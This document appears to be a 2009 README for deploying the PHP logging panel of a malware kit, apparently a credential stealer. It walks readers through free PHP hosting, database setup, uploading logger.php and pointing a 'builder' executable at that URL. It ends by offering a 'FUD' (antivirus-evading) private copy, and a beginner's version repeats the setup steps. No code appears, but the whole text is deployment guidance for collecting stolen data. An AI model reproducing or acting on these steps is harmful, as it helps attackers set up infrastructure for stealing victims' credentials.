========================
 Author: icyinferno
 E-mail: 1cy1nferno109@gmail.com
 Copyright ©2009, IcyInferno Productions 
========================

Steps:

1.) Find a host that supports PHP
	http://www.000webhost.com
	http://www.tripod.lycos.co.uk
	http://www.godaddy.com

2.) Once a account on the host has been made, make a database. 

1.) Configurations (open db_login.php with a texteditor)
	Replace the string 'icyinferno' to your desired username for the login.	
	Replace the string 'password' to your desired password for the login.
	Replace the string 'localhost' to whatever phpmyadmin says your host is.
	Replace the string 'sqluser' to whatever your phpmyadmin username is.
	Replace the string 'sqlpass' to whatever your phpmyadmin password is.
	Replace the string 'remotepenDB' to whatever you named the database.

3.) Once this is completed, run install.php. (It will auto-create the logs table within the database)

4.) If the installer reads 'Tables have been successfully added!' then delete installer.php.

5.) When building the executable from the builder, make sure you configure
    the PHP url to 'logger.php' (www.site.com/logger.php)

6.) Enjoy and if you desire a FUD private copy contact me.



=====================================
EXTENDED README for 'special ones' :D.
=====================================
Because some of you might have troubles following the above readme i am including a more detailed readme for noobs who don't understand the above.

(In this example i will be using, http://www.000webhost.com as my host)

Steps:

1.) Register a account - http://www.000webhost.com/order.php (Its free don't worry)

2.) Check your email, they will email you all the credentials for the account.

3.) Login at http://members.000webhost.com/login.php / (Go to CPanel/Software and Services/MySQL)
    	Create a database, write down somewhere the name of the database, MYSQL username, and the password for MYSQL user.	
	Then once you have created the database, the page will redirect and will show something like this, '$mysql_host = "mysql10.000webhost.com";'
	Remember this and write it down somewhere. (Yours will be different from mine)

4.) After this, do the 'db_login.php' configurations that are listed above with the values 
    of what you wrote down earlier, name, username, password, host.

5.) Once the configurations have been completed, download a FTP client, connect to whatever ftp address that they emailed you. (In my case ftp.userid.hostoi.com) 
    and finally upload every file in the PHP folder.

6.) Once this is completed, run install.php. (It will auto-create the logs table within the database)

7.) If the installer reads 'Tables have been successfully added!' then go back on your FTP client and delete installer.php.

8.) Finished, builder PHP url = http://userid.hostoi.com/logger.php

